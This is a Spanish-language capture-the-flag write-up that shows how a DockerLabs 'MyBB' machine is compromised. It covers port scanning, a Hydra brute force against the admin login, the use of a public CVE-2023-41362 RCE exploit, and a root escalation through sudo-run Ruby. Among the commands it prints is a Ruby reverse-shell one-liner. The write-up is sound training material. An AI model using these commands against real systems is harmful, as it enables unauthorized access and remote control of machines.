# MyBB

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN MyBB`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_1.png)     

Tenemos solo un puerto abierto, el 80.  
Echemos un vistazo para ver qué corre en ese puerto.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_2.png)      

Veamos esta página y si intentamos hacer clic en "Ir al foro", veremos que somos redirigidos a la dirección panel.mybb.dl.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_3.png)   

Modifiquemos entonces nuestro archivo de hosts y agreguemos esta entrada, y volvemos a ver que corre a esta dirección.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_4.png)   

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_5.png)    

Hacemos un poco de fuzzing con la herramienta **gobuster**.  
Para ello ejecutamos el comando:  

`sudo gobuster dir -u http://panel.mybb.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt `  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_6.png)     

Vemos que hay 2 entradas interesantes. Una llamada backups y la otra admin.  

Analicemos el recurso backups.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_7.png)    

Nos llama la atención una línea en particular donde se ve que un usuario llamado alice intentó acceder con una contraseña que aparece hasheada.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_8.png)      

Copiamos la cadena en un archivo de texto que llamaremos **hash** y lo pasaremos a John the Ripper para ver si podemos descubrir la contraseña.  
Ejecutamos el comando:  

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_9.png)       

¡Bien!   
¡Tenemos una contraseña!   
Intentemos iniciar sesión en el foro.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_10.png)   

Nos devuelve un error.  

Echemos un vistazo a la dirección: http://panel.mybb.dl/admin/  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_11.png)   

Nos encontramos frente a un panel de inicio de sesión.  
Lo que podemos hacer es intentar realizar un ataque de fuerza bruta con Hydra.  
Usaremos el usuario **admin**, que vimos ser un usuario válido al analizar previamente el registro de respaldo.  

`sudo hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:username=^USER^&password=^PASS^:The username and password combination you entered is invalid."`  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_12.png)   

El comando funcionó, aunque nos devolvió una serie de falsos positivos.  
Después de probar pacientemente algunos de ellos, vemos que podemos iniciar sesión con la contraseña **babygirl**.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_13.png)     

Una vez dentro, nos llama la atención el mensaje que nos informa que la versión no está actualizada.  
Bien, tenemos el número exacto de la versión de MyBB, así que buscaremos en internet si hay vulnerabilidades conocidas.  

Descubrimos que esta versión es vulnerable (CVE-2023-41362 - MyBB ACP RCE).  
Descargamos el exploit que encontramos en GitHub en la siguiente dirección: [https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE](https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE).  
Ejecutamos el script con el comando:  

`python3 exploit.py http://panel.mybb.dl admin babygirl`  

e intentamos enviarnos una reverse shell.  
Vamos al sitio revshells.com [https://www.revshells.com/](https://www.revshells.com/) y en este caso funcionará la reverse shell en Perl.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_14.png)      

Nos ponemos a escuchar en el puerto 6969 y ejecutamos el comando.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_15.png)     

¡Perfecto, estamos dentro!  
Ahora, como de costumbre, realizaremos el tratamiento de la shell para poder trabajar más cómodamente.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_16.png)     

# Escalada de privilegios

Ejecutamos los típicos comandos:

`sudo -l`  
`find / -perm -400 2>/dev/null`

para intentar elevar nuestros privilegios, pero no obtenemos ninguna información interesante.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_17.png)       

Vemos entonces si en la máquina existe un usuario llamado **alice** del cual tenemos una contraseña que descubrimos previamente.    

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_18.png)       

Bien, intentemos iniciar sesión como **alice**.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_19.png)       

¡Excelente! Ahora ejecutemos `sudo -l` para ver si podemos escalar nuestros privilegios.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_20.png)      

Interesante, podemos ejecutar archivos `.rb` con permisos de sudo.  
Lo que haremos será crear un script en Ruby que nos envíe una reverse shell, por ejemplo, en el puerto 7070.  
Una vez más, usaremos el sitio web de revshells.com para generar nuestro script.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_21.png)    

Para crear el script Ruby con echo desde el terminal, puedes usar el siguiente comando:  

`echo "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"172.17.0.1\",7070))'" > reverse_shell.rb`  

Y luego les daremos permisos de ejecución con el comando:

`chmod +x reverse_shell.rb`
 
![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_22.png)      

Ahora no nos quedará más que ponernos a escuchar en el puerto 7070 de nuestra máquina atacante y ejecutar el comando `sudo ./reverse_shell.rb` en la máquina víctima.  

![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_23.png)     

¡Y listo!  
¡Somos root!













